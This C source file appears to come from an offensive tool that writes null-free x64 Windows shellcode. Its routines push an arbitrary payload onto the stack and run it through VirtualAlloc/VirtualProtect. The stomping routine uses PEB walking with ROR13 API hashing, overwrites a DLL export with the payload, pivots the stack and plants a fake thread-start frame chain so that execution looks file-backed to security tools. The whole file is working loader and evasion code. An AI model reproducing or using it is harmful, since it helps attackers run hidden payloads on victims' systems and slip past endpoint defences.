#include "shellwriter.h"
#include "peb_walk_blob.h"

#define SCW_PAGE_READWRITE 0x04
#define SCW_PAGE_EXECUTE_READ 0x20
#define SCW_MEM_COMMIT 0x1000
#define SCW_MEM_RESERVE 0x2000

void scw_init(SCW *w, u8 *buf, int cap)
{
    w->buf = buf;
    w->len = 0;
    w->cap = cap;
    w->stack_bytes = 0;
}

void scw_append(SCW *w, const u8 *b, int n)
{
    int i;
    for (i = 0; i < n; i++)
        if (w->len < w->cap)
            w->buf[w->len++] = b[i];
}

int scw_check_nulls(const SCW *w)
{
    int i;
    for (i = 0; i < w->len; i++)
        if (w->buf[i] == 0)
            return i;
    return -1;
}

/* Null-free: rax = value.
 * value==0 → xor rax,rax (3 bytes).
 * else → mov rax,XA; mov r15,XB; xor rax,r15 (23 bytes).
 * XB=0x0101…01 adjusted per byte to ensure XA has no nulls. */
void scw_set_rax(SCW *w, u64 value)
{
    u8 b[10];
    int i;

    if (value == 0)
    {
        b[0] = 0x48;
        b[1] = 0x31;
        b[2] = 0xC0; /* xor rax, rax */
        scw_append(w, b, 3);
        return;
    }

    {
        u64 xb = 0x0101010101010101ULL;
        for (i = 0; i < 8; i++)
            if (((u8 *)&value)[i] == 0x01)
                ((u8 *)&xb)[i] = 0x02;
        u64 xa = value ^ xb;

        b[0] = 0x48;
        b[1] = 0xB8; /* mov rax, xa */
        b[2] = (u8)xa;
        b[3] = (u8)(xa >> 8);
        b[4] = (u8)(xa >> 16);
        b[5] = (u8)(xa >> 24);
        b[6] = (u8)(xa >> 32);
        b[7] = (u8)(xa >> 40);
        b[8] = (u8)(xa >> 48);
        b[9] = (u8)(xa >> 56);
        scw_append(w, b, 10);

        b[0] = 0x49;
        b[1] = 0xBF; /* mov r15, xb */
        b[2] = (u8)xb;
        b[3] = (u8)(xb >> 8);
        b[4] = (u8)(xb >> 16);
        b[5] = (u8)(xb >> 24);
        b[6] = (u8)(xb >> 32);
        b[7] = (u8)(xb >> 40);
        b[8] = (u8)(xb >> 48);
        b[9] = (u8)(xb >> 56);
        scw_append(w, b, 10);
    }

    b[0] = 0x4C;
    b[1] = 0x31;
    b[2] = 0xF8; /* xor rax, r15 */
    scw_append(w, b, 3);
}

void scw_push_value(SCW *w, u64 value)
{
    u8 push_rax = 0x50;
    scw_set_rax(w, value);
    scw_append(w, &push_rax, 1);
    w->stack_bytes += 8;
}

/* Push len bytes so RSP → data[0]. Iterates reverse, pads to 8. */
void scw_push_buffer(SCW *w, const u8 *data, int len)
{
    int padded = (len + 7) & ~7;
    int i, j;
    for (i = padded - 8; i >= 0; i -= 8)
    {
        u64 val = 0;
        for (j = 0; j < 8; j++)
            if (i + j < len)
                ((u8 *)&val)[j] = data[i + j];
        scw_push_value(w, val);
    }
}

static void _mov_arg_rax(SCW *w, int reg)
{
    u8 b[3];
    if (reg == 0)
    {
        b[0] = 0x48;
        b[1] = 0x89;
        b[2] = 0xC1;
    } /* mov rcx, rax */
    else if (reg == 1)
    {
        b[0] = 0x48;
        b[1] = 0x89;
        b[2] = 0xC2;
    } /* mov rdx, rax */
    else if (reg == 2)
    {
        b[0] = 0x49;
        b[1] = 0x89;
        b[2] = 0xC0;
    } /* mov r8,  rax */
    else
    {
        b[0] = 0x49;
        b[1] = 0x89;
        b[2] = 0xC1;
    } /* mov r9,  rax */
    scw_append(w, b, 3);
}

void scw_set_arg(SCW *w, int reg, u64 value)
{
    scw_set_rax(w, value);
    _mov_arg_rax(w, reg);
}

void scw_set_arg_sp(SCW *w, int reg, int offset)
{
    u8 add_rax_rsp[3] = {0x48, 0x01, 0xE0};
    scw_set_rax(w, (u64)offset);
    scw_append(w, add_rax_rsp, 3);
    _mov_arg_rax(w, reg);
}

/* Null-free aligned call. Inserts sub rsp,8 if misaligned (permanent). */
void scw_call(SCW *w, u64 addr)
{
    u8 sub_rsp_8[4] = {0x48, 0x83, 0xEC, 0x08};
    u8 add_rsp_8[4] = {0x48, 0x83, 0xC4, 0x08};

    if (w->stack_bytes % 16)
    {
        scw_append(w, sub_rsp_8, 4);
        w->stack_bytes += 8;
    }

    scw_set_rax(w, addr);
    {
        u8 call_rax[2] = {0xFF, 0xD0};
        scw_append(w, call_rax, 2);
    }

    if (w->stack_bytes % 16)
    {
        scw_append(w, add_rsp_8, 4);
        w->stack_bytes -= 8;
    }
}

/* Generates stub: push sc → VirtualAlloc → copy → VirtualProtect → jmp.
 * Uses anonymous unbacked memory; prefer scw_stomp_and_call for file-backed. */
void scw_load_and_call(SCW *w,
                       u64 virtual_alloc,
                       u64 virtual_protect,
                       const u8 *sc, int sc_len)
{
    scw_push_buffer(w, sc, sc_len);
    int pos_sc = w->stack_bytes;

    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    scw_set_arg(w, 0, 0);
    scw_set_arg(w, 1, (u64)sc_len);
    scw_set_arg(w, 2, SCW_MEM_COMMIT);
    scw_set_arg(w, 3, SCW_PAGE_READWRITE);
    scw_call(w, virtual_alloc);

    {
        u8 b[3] = {0x49, 0x89, 0xC4};
        scw_append(w, b, 3);
    } /* mov r12, rax */
    {
        u8 b[3] = {0x49, 0x89, 0xC2};
        scw_append(w, b, 3);
    } /* mov r10, rax */

    scw_set_rax(w, (u64)sc_len);
    {
        u8 b[3] = {0x49, 0x89, 0xC3};
        scw_append(w, b, 3);
    } /* mov r11, rax */

    scw_set_arg_sp(w, 0, w->stack_bytes - pos_sc);

    {
        u8 copy_loop[16] = {
            0x8A, 0x01,       /* mov al, [rcx]  */
            0x41, 0x88, 0x02, /* mov [r10], al  */
            0x48, 0xFF, 0xC1, /* inc rcx        */
            0x49, 0xFF, 0xC2, /* inc r10        */
            0x49, 0xFF, 0xCB, /* dec r11        */
            0x75, 0xF0        /* jnz -16        */
        };
        scw_append(w, copy_loop, 16);
    }

    {
        u8 b[3] = {0x4C, 0x89, 0xE1};
        scw_append(w, b, 3);
    } /* mov rcx, r12 */
    scw_set_arg(w, 1, (u64)sc_len);
    scw_set_arg(w, 2, SCW_PAGE_EXECUTE_READ);
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_sc);
    scw_call(w, virtual_protect);

    if (w->stack_bytes % 16)
    {
        u8 align[3] = {0x58, 0x50, 0x50}; /* pop rax; push rax; push rax */
        scw_append(w, align, 3);
        w->stack_bytes += 8;
    }

    {
        u8 jmp_r12[3] = {0x41, 0xFF, 0xE4};
        scw_append(w, jmp_r12, 3);
    }
}

void scw_call_loadlib(SCW *w, u64 loadlibrary_a, const char *dll_name)
{
    int len = 0;
    while (dll_name[len])
        len++;
    len++;

    scw_push_buffer(w, (const u8 *)dll_name, len);
    int pos_buf = w->stack_bytes;

    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    scw_set_arg_sp(w, 0, w->stack_bytes - pos_buf);
    scw_call(w, loadlibrary_a);
}

void scw_call_msgbox(SCW *w, u64 messagebox_a,
                     const char *text, const char *caption, u32 type)
{
    int tlen = 0, clen = 0;
    while (text[tlen])
        tlen++;
    tlen++;
    while (caption[clen])
        clen++;
    clen++;

    scw_push_buffer(w, (const u8 *)caption, clen);
    int pos_caption = w->stack_bytes;

    scw_push_buffer(w, (const u8 *)text, tlen);
    int pos_text = w->stack_bytes;

    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    scw_set_arg(w, 0, 0);
    scw_set_arg_sp(w, 1, w->stack_bytes - pos_text);
    scw_set_arg_sp(w, 2, w->stack_bytes - pos_caption);
    scw_set_arg(w, 3, (u64)type);
    scw_call(w, messagebox_a);
}

void scw_call_terminate(SCW *w, u64 nt_terminate, u64 handle, u32 exit_status)
{
    scw_set_arg(w, 0, handle);
    scw_set_arg(w, 1, (u64)exit_status);
    scw_call(w, nt_terminate);
}

static u32 _ror13h(u32 v) { return (v >> 13) | (v << 19); }

static u32 _mh_mod(const char *s) /* tolower — module names are case-insensitive */
{
    u32 r = 0;
    while (*s)
    {
        u8 c = (u8)*s++;
        if (c >= 'A' && c <= 'Z')
            c += 0x20;
        r = _ror13h(r) + c;
    }
    return r;
}

static u32 _mh_exp(const char *s) /* no tolower — export names are case-sensitive */
{
    u32 r = 0;
    while (*s)
        r = _ror13h(r) + (u8)*s++;
    return r;
}

/* Generates stub that at runtime:
 *   1. push sc (null-free encoded)
 *   2. PEB walk → dll_name base (r13), export walk → export_name addr (r12)
 *   3. VirtualProtect(r12, RW) → copy sc → VirtualProtect(r12, RX)
 *   4. Pivot RSP to TEB.StackBase-0x200
 *   5. Plant frame chain: [RSP]=btit, [RSP+0x28]=ruts, [RSP+0x68]=NULL
 *   6. jmp r12
 * Execution appears file-backed. No VirtualAlloc. */
void scw_stomp_and_call(SCW *w,
                        u64 virtual_protect,
                        const char *dll_name,
                        const char *export_name,
                        const u8 *sc, int sc_len,
                        u64 btit_addr, u64 ruts_addr)
{
    u32 dll_hash = _mh_mod(dll_name);
    u32 func_hash = _mh_exp(export_name);

    u8 blob[PEB_WALK_SIZE];
    int i;
    for (i = 0; i < PEB_WALK_SIZE; i++)
        blob[i] = _peb_walk_blob[i];
    blob[DLL_HASH_OFF + 0] = (u8)(dll_hash);
    blob[DLL_HASH_OFF + 1] = (u8)(dll_hash >> 8);
    blob[DLL_HASH_OFF + 2] = (u8)(dll_hash >> 16);
    blob[DLL_HASH_OFF + 3] = (u8)(dll_hash >> 24);
    blob[FUNC_HASH_OFF + 0] = (u8)(func_hash);
    blob[FUNC_HASH_OFF + 1] = (u8)(func_hash >> 8);
    blob[FUNC_HASH_OFF + 2] = (u8)(func_hash >> 16);
    blob[FUNC_HASH_OFF + 3] = (u8)(func_hash >> 24);

    scw_push_buffer(w, sc, sc_len);
    int pos_sc = w->stack_bytes;

    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    scw_append(w, blob, PEB_WALK_SIZE);

    scw_push_value(w, 0);
    int pos_oldprot = w->stack_bytes;

    {
        u8 b[3] = {0x4C, 0x89, 0xE1};
        scw_append(w, b, 3);
    } /* mov rcx, r12 */
    scw_set_arg(w, 1, (u64)sc_len);
    scw_set_arg(w, 2, SCW_PAGE_READWRITE);
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_oldprot);
    scw_call(w, virtual_protect);

    scw_set_arg_sp(w, 0, w->stack_bytes - pos_sc);
    {
        u8 b[3] = {0x4C, 0x89, 0xE0};
        scw_append(w, b, 3);
    } /* mov rax, r12 */
    {
        u8 b[3] = {0x49, 0x89, 0xC2};
        scw_append(w, b, 3);
    } /* mov r10, rax */
    scw_set_rax(w, (u64)sc_len);
    {
        u8 b[3] = {0x49, 0x89, 0xC3};
        scw_append(w, b, 3);
    } /* mov r11, rax */

    {
        u8 copy_loop[16] = {
            0x8A, 0x01,       /* mov al, [rcx]  */
            0x41, 0x88, 0x02, /* mov [r10], al  */
            0x48, 0xFF, 0xC1, /* inc rcx        */
            0x49, 0xFF, 0xC2, /* inc r10        */
            0x49, 0xFF, 0xCB, /* dec r11        */
            0x75, 0xF0        /* jnz -16        */
        };
        scw_append(w, copy_loop, 16);
    }

    {
        u8 b[3] = {0x4C, 0x89, 0xE1};
        scw_append(w, b, 3);
    } /* mov rcx, r12 */
    scw_set_arg(w, 1, (u64)sc_len);
    scw_set_arg(w, 2, SCW_PAGE_EXECUTE_READ);
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_oldprot);
    scw_call(w, virtual_protect);

    /* RSP pivot: mov rax, gs:[0+8] (TEB.StackBase); r14 = rax - 0x200; rsp = r14.
     * Using rcx=0 avoids null bytes in the gs-relative encoding. */
    {
        u8 xor_ecx[2] = {0x31, 0xC9};
        u8 mov_rax_teb[5] = {0x65, 0x48, 0x8B, 0x41, 0x08};
        u8 mov_r14_rax[3] = {0x49, 0x89, 0xC6};
        u8 sub_r14_rax[3] = {0x49, 0x29, 0xC6};
        u8 mov_rsp_r14[3] = {0x4C, 0x89, 0xF4};
        scw_append(w, xor_ecx, 2);
        scw_append(w, mov_rax_teb, 5);
        scw_append(w, mov_r14_rax, 3);
        scw_set_rax(w, 0x200);
        scw_append(w, sub_r14_rax, 3);
        scw_append(w, mov_rsp_r14, 3);
        w->stack_bytes = 0;
    }

    /* Plant frame chain (NULL → RUTS → BTIT top-down):
     *   [RSP+0x00] = btit_addr
     *   [RSP+0x30] = ruts_addr   (0x08 + SCW_BTIT_ALLOC = 0x30)
     *   [RSP+0x70] = NULL        (0x30 + 0x08 + SCW_RUTS_ALLOC = 0x70) */
    scw_push_value(w, 0);
    {
        u8 sub_rsp[4] = {0x48, 0x83, 0xEC, SCW_RUTS_ALLOC};
        scw_append(w, sub_rsp, 4);
        w->stack_bytes += SCW_RUTS_ALLOC;
    }
    scw_push_value(w, ruts_addr);
    {
        u8 sub_rsp[4] = {0x48, 0x83, 0xEC, SCW_BTIT_ALLOC};
        scw_append(w, sub_rsp, 4);
        w->stack_bytes += SCW_BTIT_ALLOC;
    }
    scw_push_value(w, btit_addr);

    {
        u8 jmp_r12[3] = {0x41, 0xFF, 0xE4};
        scw_append(w, jmp_r12, 3);
    }

    /* UNICODE_STRING.Length must be even (WCHAR-aligned). */
    if (w->len & 1)
    {
        u8 nop = 0x90;
        scw_append(w, &nop, 1);
    }
}
